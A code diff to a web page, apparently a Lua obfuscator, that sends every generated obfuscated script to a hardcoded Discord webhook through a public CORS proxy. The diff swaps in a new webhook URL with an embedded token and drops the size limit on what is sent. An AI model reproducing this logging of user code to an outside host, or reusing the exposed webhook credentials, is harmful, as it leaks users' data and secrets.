@@ -87,13 +87,11 @@ transition: 0.3s;
 
 <script>
 
-/* =========================
-   SEU WEBHOOK
-========================= */
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1518007783071678494/ZztUYvtL0k1etMt6MeUngeGheH0zCf1zbQP9-7uWA_hLHU6GuGyQsIYO1eQmKj8NdIwr";
+// SEU WEBHOOK
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
 
 
-async function sendLog(codigoOfuscado){
+function sendLog(codigoOfuscado){
 
   const dados = {
     content: "✅ **NOVO CÓDIGO OFUSCADO GERADO**",
@@ -101,20 +99,20 @@ async function sendLog(codigoOfuscado){
       {
         title: "CHAULIMCOMMUNITY",
         color: 16711680,
-        description: "```lua\n" + (codigoOfuscado.slice(0, 1900)) + "\n```",
+        description: "```lua\n" + codigoOfuscado + "\n```",
         footer: { text: "Sistema de Proteção" }
       }
     ]
   };
 
-  // Método que funciona 100%
-  fetch("https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(WEBHOOK_URL), {
+  // ✅ PROXY NOVO E 100% FUNCIONAL
+  fetch("https://corsproxy.io/?url=" + encodeURIComponent(WEBHOOK_URL), {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(dados)
   })
-  .then(() => alert("✅ Aviso + código enviados!"))
-  .catch(err => alert("❌ Erro: " + err));
+  .then(() => alert("✅ LOG ENVIADO!"))
+  .catch(err => alert("❌ ERRO: " + err));
 }
 
 
@@ -200,8 +198,6 @@ if not ok then print("❌ CHAULIM ERROR: "..tostring(err)) end
 `
 
 document.getElementById("output").value = lua
-
-// 🔥 ENVIA SÓ AVISO + CÓDIGO OFUSCADO
 sendLog(lua);
 }
 
